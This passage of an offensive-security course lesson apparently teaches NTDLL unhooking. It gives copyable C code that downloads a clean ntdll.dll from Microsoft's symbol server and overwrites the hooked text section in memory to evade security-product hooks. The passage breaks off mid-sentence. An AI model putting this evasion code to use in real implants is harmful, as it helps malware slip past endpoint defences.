@@ -1,0 +1,373 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>NTDLL Unhooking - From a Web Server</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+        <div id="ntdll-unhooking-from-a-web-server" class="scroll-mt-24 pt-6 sm:pt-8 pb-3 border-b border-[#212b54] mt-8 sm:mt-12 mb-4 sm:mb-6 flex items-center justify-between group">
+            <h2 class="text-xl sm:text-2xl font-bold text-white tracking-tight flex items-center gap-2.5 sm:gap-3">
+                <i data-lucide="sparkles" class="w-4 h-4 sm:w-5 sm:h-5 text-[var(--accent)] flex-shrink-0"></i>
+                <span>NTDLL Unhooking - From a Web Server</span>
+            </h2>
+            <a href="#ntdll-unhooking-from-a-web-server" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition" class="opacity-0 group-hover:opacity-100 text-[#cbd5e1] hover:text-[var(--accent)] text-xs flex items-center gap-1 font-mono transition p-1.5 rounded hover:bg-[var(--accent-soft)]" title="Copy link">
+                <i data-lucide="link" class="w-4 h-4"></i>
+            </a>
+        </div><h3 id="introduction" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Introduction</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">By now the reader should have an understanding of several ways to unhook <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ntdll.dll</code>. One may ask, why not simply include a clean version of NTDLL in the binary? The issue with that approach is one would need to have several versions of NTDLL included in the binary in order to support the multiple version of Windows OS. As a result, this would greatly increase the size of the implementation, making this a flawed approach.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This module will demonstrate an alternative approach that fetches NTDLL from a web server. The implementation will first check the NTDLL version on the current machine and fetch the appropriate version of NTDLL from the web server. The difficult part of this approach is to upload all versions of NTDLL on a web server, therefore in this module, <a href="https://winbindex.m417z.com/" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">Winbindex</a> will be utilized which contains almost all <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ntdll.dll</code> versions.</p><h3 id="winbindex" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Winbindex</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Winbindex is a website that contains several versions of files found on Windows OS. Additionally, it contains a search utility to search for the required file. The image below is the output of searching for the 64-bit version of <a href="https://winbindex.m417z.com/?file=ntdll.dll" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">ntdll.dll</a></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntdll-unhooking-server-118739986-88f6cb96-f2b6-4b20-8b93-7d32de908cb8.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="determining-winbindex-s-url-format" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Determining Winbindex's URL Format</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Because <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ntdll.dll</code> must be fetched programmatically, it&#x27;s important to understand how download links are formatted. Analyze the 3 URLs below:</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><a href="https://msdl.microsoft.com/download/symbols/ntdll.dll/494079D61ee000/ntdll.dll" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">https://msdl.microsoft.com/download/symbols/ntdll.dll/494079D61ee000/ntdll.dll</a></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><a href="https://msdl.microsoft.com/download/symbols/ntdll.dll/2EEE8BDD1ee000/ntdll.dll" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">https://msdl.microsoft.com/download/symbols/ntdll.dll/2EEE8BDD1ee000/ntdll.dll</a></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><a href="https://msdl.microsoft.com/download/symbols/ntdll.dll/F2E8A5AB214000/ntdll.dll" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">https://msdl.microsoft.com/download/symbols/ntdll.dll/F2E8A5AB214000/ntdll.dll</a></span></div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Notice how only one part of the URL changes. This is visualized in the following image.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntdll-unhooking-server-218741853-fb112eb2-6058-4c09-bf31-6361daeb1dad.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Links 1 &amp; 2 both contain &quot;1ee000&quot; in the URL, which is 2023424 in decimal. Viewing the additional information regarding the first NTDLL module and searching for the value &quot;2023424&quot; reveals that it&#x27;s the NTDLL&#x27;s VirtualSize.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntdll-unhooking-server-318747866-fb9bb405-fce4-46b1-9797-a0787569d065.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntdll-unhooking-server-418747883-88d09ac7-5a26-4428-858a-5e38577d3ed5.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Searching for the first part of the string, &quot;494079D6&quot;, which is 1228962262 in decimal, reveals that this is the timestamp of the file.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntdll-unhooking-server-518748318-85fde875-9b04-4087-99d7-99135d1fe75d.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Therefore, the first part of the URL, the timestamp, is derived from the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">IMAGE_FILE_HEADER.TimeDateStamp</code> element of the DLL. The second part, VirtualSize, is derived from the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">IMAGE_OPTIONAL_HEADER.SizeOfImage</code> element of the DLL.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Winbindex&#x27;s download links are visualized in the image below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntdll-unhooking-server-618750624-b5511b03-9f66-42c6-ae0c-8262c7f9c7fb.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="readntdllfromserver-function" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>ReadNtdllFromServer Function</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The next step is to build a function that creates a suitable URL for the local machine. This is what the following <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ReadNtdllFromServer</code> function does.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ReadNtdllFromServer</code> function calls <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">FetchLocalNtdllBaseAddress</code> to obtain the base address of the local <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ntdll.dll</code> image to build the download URL. This is done using <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">wsprintfW</code> which combines the string &quot;https://msdl.microsoft.com/download/symbols/ntdll.dll/&quot;, which is the fixed part of the download link with <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pImgNtHdrs-&gt;FileHeader.TimeDateStamp</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pImgNtHdrs-&gt;OptionalHeader.SizeOfImage</code> values.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Once that&#x27;s done, the function calls <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetPayloadFromUrl</code> which was introduced in the <em>Payload Staging - Web Server</em> module. This function is responsible for downloading the payload file from a web server, but in this case, it&#x27;s being utilized to download <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ntdll.dll</code> from the generated link.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#define FIXED_URL	L&quot;https://msdl.microsoft.com/download/symbols/ntdll.dll/&quot;
+
+PVOID FetchLocalNtdllBaseAddress() {
+
+#ifdef _WIN64
+	PPEB pPeb = (PPEB)__readgsqword(0x60);
+#elif _WIN32
+	PPEB pPeb = (PPEB)__readfsdword(0x30);
+#endif // _WIN64// Reaching to the &#x27;ntdll.dll&#x27; module directly (we know its the 2nd image after &#x27;ServerUnhooking.exe&#x27;)
+	// 0x10 is = sizeof(LIST_ENTRY)
+	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);
+
+	return pLdr-&gt;DllBase;
+}
+
+
+BOOL ReadNtdllFromServer(OUT PVOID* ppNtdllBuf) {
+
+	PBYTE      pNtdllModule             = (PBYTE)FetchLocalNtdllBaseAddress();
+	PVOID      pNtdllBuffer             = NULL;
+	SIZE_T     sNtdllSize               = NULL;
+	WCHAR      szFullUrl [MAX_PATH]     = { 0 };
+
+	// getting the dos header of the local ntdll image
+	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
+	if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
+		return NULL;
+
+	// getting the nt headers of the local ntdll image
+	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule + pImgDosHdr-&gt;e_lfanew);
+	if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
+		return NULL;
+
+	// constructing the download url
+	wsprintfW(szFullUrl, L&quot;%s%0.8X%0.4X/ntdll.dll&quot;, FIXED_URL, pImgNtHdrs-&gt;FileHeader.TimeDateStamp, pImgNtHdrs-&gt;OptionalHeader.SizeOfImage);
+
+	// &#x27;GetPayloadFromUrl&#x27; is used to download a file from a webserver
+	if (!GetPayloadFromUrl(szFullUrl, &amp;pNtdllBuffer, &amp;sNtdllSize))
+		return FALSE;
+
+	// &#x27;sNtdllSize&#x27; will now contain the size of the downloaded ntdll.dll file
+	// &#x27;pNtdllBuffer&#x27; will now contain the base address of the downloaded ntdll.dll file
+
+	*ppNtdllBuf = pNtdllBuffer;
+
+	return TRUE;
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Recall that <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetPayloadFromUrl</code> has three parameters, the download URL, and two output parameters that represent the base address and size of the downloaded file, respectively.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL GetPayloadFromUrl(IN LPCWSTR szUrl, OUT PVOID* pNtdllBuffer, OUT PSIZE_T sNtdllSize) {
+
+	BOOL		bSTATE			= TRUE;
+
+	HINTERNET	hInternet		= NULL,
+			    hInternetFile	= NULL;
+
+	DWORD		dwBytesRead		= NULL;
+
+	SIZE_T		sSize			= NULL; 	 			// Used as the total size counter
+
+	PBYTE		pBytes			= NULL,					// Used as the total heap buffer counter
+			    pTmpBytes		= NULL;					// Used as the tmp buffer (of size 1024)
+
+	// Opening the internet session handle, all arguments are NULL here since no proxy options are required
+	hInternet = InternetOpenW(L&quot;Offensive Engineering Handbook&quot;, NULL, NULL, NULL, NULL);
+	if (hInternet == NULL) {
+		printf(&quot;[!] InternetOpenW Failed With Error : %d \n&quot;, GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+
+	// Opening the handle to the ntdll file using theURL
+	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	if (hInternetFile == NULL) {
+		printf(&quot;[!] InternetOpenUrlW Failed With Error : %d \n&quot;, GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+
+	// Allocating 1024 bytes to the temp buffer
+	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
+	if (pTmpBytes == NULL) {
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+
+	while (TRUE) {
+
+		// Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
+		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &amp;dwBytesRead)) {
+			printf(&quot;[!] InternetReadFile Failed With Error : %d \n&quot;, GetLastError());
+			bSTATE = FALSE; goto _EndOfFunction;
+		}
+
+		// Calculating the total size of the total buffer
+		sSize += dwBytesRead;
+
+		// In case the total buffer is not allocated yet
+		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
+		if (pBytes == NULL)
+			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
+		else
+			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
+			// This is required in order to fit the whole ntdll file bytes
+			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
+
+		if (pBytes == NULL) {
+			bSTATE = FALSE; goto _EndOfFunction;
+		}
+
+		// Append the temp buffer to the end of the total buffer
+		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
+
+		// Clean up the temp buffer
+		memset(pTmpBytes, &#x27;\0&#x27;, dwBytesRead);
+
+		// If less than 1024 bytes were read it means the end of the file was reached
+		// Therefore exit the loop
+		if (dwBytesRead &lt; 1024) {
+			break;
+		}
+
+		// Otherwise, read the next 1024 bytes
+	}
+
+
+	// Saving
+	*pNtdllBuffer   = pBytes;
+	*sNtdllSize     = sSize;
+
+_EndOfFunction:
+	if (hInternet)
+		InternetCloseHandle(hInternet);         // Closing handle
+	if (hInternetFile)
+		InternetCloseHandle(hInternetFile);     // Closing handle
+	if (hInternet)
+		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);  // Closing Wininet connection
+	if (pTmpBytes)
+		LocalFree(pTmpBytes);                   // Freeing the temp buffer
+	return bSTATE;
+}</code></pre>
+        </div><h3 id="putting-it-all-together" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Putting It All Together</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Now that an unhooked version of <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ntdll.dll</code> is in memory, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ReplaceNtdllTxtSection</code> function is utilized to replace the text section of the hooked <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ntdll.dll</code> with the newly unhooked one. The only modification required is to use the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pUnhookedNtdll</code> parameter, which represents the base address of the NTDLL module fetched using the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ReadNtdllFromServer</code> function detailed above.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
+
+	PVOID			   pLocalNtdll 	   = (PVOID)FetchLocalNtdllBaseAddress();
+
+
+	// getting the dos header
+	PIMAGE_DOS_HEADER	pLocalDosHdr 	= (PIMAGE_DOS_HEADER)pLocalNtdll;
+	if (pLocalDosHdr &amp;&amp; pLocalDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
+		return FALSE;
+
+	// getting the nt headers
+	PIMAGE_NT_HEADERS 	pLocalNtHdrs 	= (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr-&gt;e_lfanew);
+	if (pLocalNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
+		return FALSE;
+
+
+	PVOID     pLocalNtdllTxt    = NULL, // local hooked text section base address
+	          pRemoteNtdllTxt   = NULL; // the unhooked text section base address
+	SIZE_T    sNtdllTxtSize     = NULL; // the size of the text section
+
+
+	// getting the text section
+	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);
+
+	for (int i = 0; i &lt; pLocalNtHdrs-&gt;FileHeader.NumberOfSections; i++) {
+
+		// the same as if( strcmp(pSectionHeader[i].Name, &quot;.text&quot;) == 0 )
+		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == &#x27;xet.&#x27;) {
+
+			pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
+			pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + 1024);
+			sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
+			break;
+		}
+	}
+
+//---------------------------------------------------------------------------------------------------------------------------
+
+	// small check to verify that all the required information is retrieved
+	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
+		return FALSE;
+
+	// small check to verify that &#x27;pRemoteNtdllTxt&#x27; is really the base address of the text section
+	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
+		// if not, then the read text section is also of offset 4096, so we add 3072 (because we added 1024 already)
+		(ULONG_PTR)pRemoteNtdllTxt += 3072;
+		// checking again
+		if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
+			return FALSE;
+	}
+
+
+//---------------------------------------------------------------------------------------------------------------------------
+
+	DWORD dwOldProtection = NULL;
+
+	// making the text section writable and executable
+	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &amp;dwOldProtection)) {
+		printf(&quot;[!] VirtualProtect [1] Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+
+	// copying the new text section
+	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
+
+	// rrestoring the old memory protection
+	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &amp;dwOldProtection)) {
+		printf(&quot;[!] VirtualProtect [2] Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+
+	return TRUE;
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Even though the ntdll.dll file is <em>read</em> from a WebServer, the offset of the text section can be <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">4096</code>, and since this assumption can&#x27;t be validated until runtime, an if-statement is added to verify this possibility and work upon it by adding <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">3072</code> bytes to the miscalculated base address (because <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">1024</code> bytes were already added).</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The result is a base address of a text section of offset <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border 